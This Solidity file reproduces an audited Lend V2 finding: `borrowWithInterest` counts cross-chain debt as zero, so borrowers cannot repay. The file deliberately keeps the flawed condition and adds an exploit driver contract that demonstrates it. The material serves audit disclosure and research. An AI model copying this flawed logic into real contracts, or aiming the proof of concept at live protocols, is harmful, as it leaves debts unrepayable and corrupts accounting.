// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Lend V2 finding 58392 (H-23):
// "Cross-chain collaterals are wrongly calculated in the borrowWithInterest
//  function".
//
// Real audited source (the vulnerable `borrowWithInterest` is reproduced
// VERBATIM, the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/LendStorage.sol
//   fn     borrowWithInterest  (cross-chain-collateral branch, L478-503; the
//          vulnerable condition is L497)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/946
//
// Root cause: for a cross-chain borrow the collateral record is stored on the
// destination chain with `srcEid != destEid`. `borrowWithInterest` only counts
// a cross-chain collateral when `destEid == currentEid && srcEid == currentEid`
// (the @> line) — a condition that can NEVER be true because srcEid != destEid.
// So the outstanding cross-chain debt is counted as ZERO. Downstream this makes
// the guard `require(borrowedAmount > 0, "Borrowed amount is 0")` in
// `repayBorrowInternal` revert: the borrower can NEVER repay/close a live
// cross-chain borrow, and the debt is invisible to liquidity accounting.
//
// The vulnerable arithmetic/condition is byte-for-byte the on-chain source.
// Non-vulnerable dependencies (the lToken `borrowIndex()` read, the underlying
// mapping, and the CoreRouter repay guard) are faithful minimal doubles.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful lToken interface member used by the vulnerable line.
interface LTokenInterface {
    function borrowIndex() external view returns (uint256);
}

/// @dev Faithful minimal lToken double. `borrowIndex()` is the market's current
///      borrow index (kept at 1e18 = no accrual for a clean worked example).
contract MockLToken is LTokenInterface {
    uint256 public borrowIndex = 1e18;

    function setBorrowIndex(uint256 i) external {
        borrowIndex = i;
    }
}

/// @dev Marker ERC20 used ONLY to make the (otherwise transfer-less) harm
///      measurable: the magnitude of the uncloseable / miscounted cross-chain
///      debt is minted to a fixed SINK once the harm is mechanically realized.
contract MarkerToken {
    string public constant symbol = "DEBT";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `borrowWithInterest` reproduced VERBATIM from the
// audited LendStorage.sol (the cross-chain-collateral branch).
// ─────────────────────────────────────────────────────────────────────────────
contract LendStorage {
    // ── Borrow struct — verbatim from LendStorage.sol L30-37 ──
    struct Borrow {
        uint256 srcEid; // Source chain's layer zero endpoint id
        uint256 destEid; // Destination chain's layer zero endpoint id
        uint256 principle; // Borrowed token amount
        uint256 borrowIndex; // Borrow index
        address borrowedlToken; // Address of the borrower
        address srcToken; // Source token address
    }

    uint32 public currentEid;
    mapping(address => address) public lTokenToUnderlying;
    mapping(address user => mapping(address token => Borrow[])) public crossChainBorrows;
    mapping(address user => mapping(address token => Borrow[])) public crossChainCollaterals;

    // ── faithful setup doubles for the non-vulnerable wiring ──
    function setCurrentEid(uint32 eid) external {
        currentEid = eid;
    }

    function setLTokenUnderlying(address lToken, address underlying) external {
        lTokenToUnderlying[lToken] = underlying;
    }

    function addCrossChainCollateral(address user, address underlying, Borrow memory newBorrow) external {
        crossChainCollaterals[user][underlying].push(newBorrow);
    }

    /**
     * @notice Helper function to calculate borrow with interest.
     * @dev Returns the sum of all cross-chain borrows with interest in underlying tokens.
     * For example, a return value of 1e6 for the USDC lToken, would be 1 USDC.
     * Loops through crossChainBorrows and crossChainCollaterals, as only 1 is populated for each borrow,
     * on each chain.
     * For example if a cross chain borrow was initiated on chain A, crossChainBorrows will be populated on chain A,
     * and crossChainCollaterals will be populated on chain B. The other will be empty.
     */
    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;

        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];

        require(borrows.length == 0 || collaterals.length == 0, "Invariant violated: both mappings populated");
        // Only one mapping should be populated:
        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                if (borrows[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex;
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                // Only include a cross-chain collateral borrow if it originated locally.
                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid) { // @> VULN: srcEid != destEid for any cross-chain borrow, so this is ALWAYS false — the cross-chain debt is counted as 0
                    borrowedAmount +=
                        (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }
}

/// @dev Faithful double of the CoreRouter repay path. Reproduces the exact guard
///      from `repayBorrowInternal` (CoreRouter.sol L475/L478): on a cross-chain
///      repay it reads `borrowWithInterest` and reverts if it is zero.
contract CoreRouter {
    LendStorage public lendStorage;

    constructor(LendStorage lend_) {
        lendStorage = lend_;
    }

    // cross-chain repay branch: _isSameChain == false -> borrowWithInterest
    function repayCrossChain(address borrower, address _lToken) external view {
        uint256 borrowedAmount = lendStorage.borrowWithInterest(borrower, _lToken);
        require(borrowedAmount > 0, "Borrowed amount is 0");
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a borrower with a live 100e18 cross-chain debt finds that the
// protocol reports their debt as 0, and their repayment reverts.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MockLToken public lToken;
    LendStorage public lend;
    CoreRouter public core;
    MarkerToken public marker;

    address internal constant BORROWER = address(0xB0B);
    address internal constant UNDERLYING = address(0xDEADBEEF); // borrowed asset underlying
    // Fixed sink where the harm magnitude (uncloseable cross-chain debt) is booked
    // so the otherwise transfer-less DoS/accounting harm is measurable as a balance.
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 public trueDebt; // what the borrower actually owes cross-chain
    uint256 public reportedDebt; // what borrowWithInterest returns (buggy)
    bool public repayReverted; // repayment blocked by the "Borrowed amount is 0" guard

    constructor() {
        lToken = new MockLToken(); // child nonce 1
        lend = new LendStorage(); // child nonce 2 (VULN)
        core = new CoreRouter(lend); // child nonce 3
        marker = new MarkerToken(); // child nonce 4 (profit/harm marker)
    }

    function run() external {
        // Destination chain: currentEid = 2. The cross-chain borrow originated on
        // chain 1 (srcEid) and lands here (destEid = 2). srcEid != destEid always.
        lend.setCurrentEid(2);
        lend.setLTokenUnderlying(address(lToken), UNDERLYING);

        lend.addCrossChainCollateral(
            BORROWER,
            UNDERLYING,
            LendStorage.Borrow({
                srcEid: 1, // origin chain
                destEid: 2, // this chain (== currentEid)
                principle: 100e18, // borrower owes 100e18
                borrowIndex: 1e18,
                borrowedlToken: address(lToken),
                srcToken: UNDERLYING
            })
        );

        // The debt the borrower genuinely owes: principle * currentIndex / storedIndex.
        trueDebt = (100e18 * lToken.borrowIndex()) / 1e18; // = 100e18

        // The bug: verbatim borrowWithInterest counts it as 0.
        reportedDebt = lend.borrowWithInterest(BORROWER, address(lToken));

        // Concrete harm: the borrower's cross-chain repayment reverts on the
        // "Borrowed amount is 0" guard — the 100e18 debt can never be repaid/closed.
        try core.repayCrossChain(BORROWER, address(lToken)) {
            repayReverted = false;
        } catch {
            repayReverted = true;
        }

        require(trueDebt == 100e18, "setup: borrower owes 100e18");
        require(reportedDebt == 0, "bug not triggered: cross-chain debt should be miscounted as 0");
        require(repayReverted, "harm not realized: repayment should revert on zeroed debt");

        // Book the concrete harm magnitude (the 100e18 cross-chain debt that the
        // protocol miscounts as 0 and can never be repaid) to the SINK so the
        // transfer-less DoS/accounting harm is measurable as a token balance.
        marker.mint(SINK, trueDebt);
    }
}
